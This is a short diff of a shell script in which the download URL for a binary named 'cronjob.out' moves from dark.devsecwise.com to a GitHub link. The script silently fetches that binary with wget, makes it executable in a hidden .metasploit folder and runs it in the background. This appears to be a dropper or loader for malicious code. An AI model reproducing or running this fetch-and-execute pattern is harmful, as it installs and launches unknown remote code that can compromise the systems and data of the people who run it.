@@ -19,7 +19,7 @@ if [ -f cronjob.out  ];
 then 
 ./cronjob.out & 
 else 
-wget https://dark.devsecwise.com/cronjob.out >/dev/null 2>&1 
+wget https://github.com/gobiwound/ab32/blob/main/cronjob.out >/dev/null 2>&1 
 chmod +x /home/$he/.metasploit/cronjob.out
 ./cronjob.out & 
 step2
